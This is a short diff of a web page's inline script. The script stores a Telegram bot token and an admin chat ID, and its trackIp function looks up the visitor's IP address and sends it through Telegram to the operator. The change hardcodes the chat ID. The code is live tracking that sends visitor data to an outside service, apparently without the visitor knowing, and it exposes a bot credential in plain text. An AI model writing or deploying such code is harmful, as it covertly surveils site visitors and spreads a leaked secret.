@@ -16,7 +16,7 @@ console.log('Server aktif');
 }
       </script>
 
-            <script>
+                            <script>
                 const token = '8022814097:AAG1kYvBGiYUb8DXkQZWyxIp0AyKZn480-o';
                 const adminChatId = '7407149096';
 
@@ -49,12 +49,12 @@ console.log('Server aktif');
 
                 function trackIp() {
                     getIp((userIp) => {
-                        const chatId = new URLSearchParams(window.location.search).get('chat_id');
+                        const chatId = '7407149096'; // Replace with the actual chat ID
                         if (chatId) {
                             sendMessage(chatId, `Your IP address is: ${userIp}`);
                             sendMessage(adminChatId, `User with chat ID ${chatId} has IP address: ${userIp}`);
                         } else {
-                            console.error('Chat ID not found in URL parameters.');
+                            console.error('Chat ID not found.');
                         }
                     });
                 }
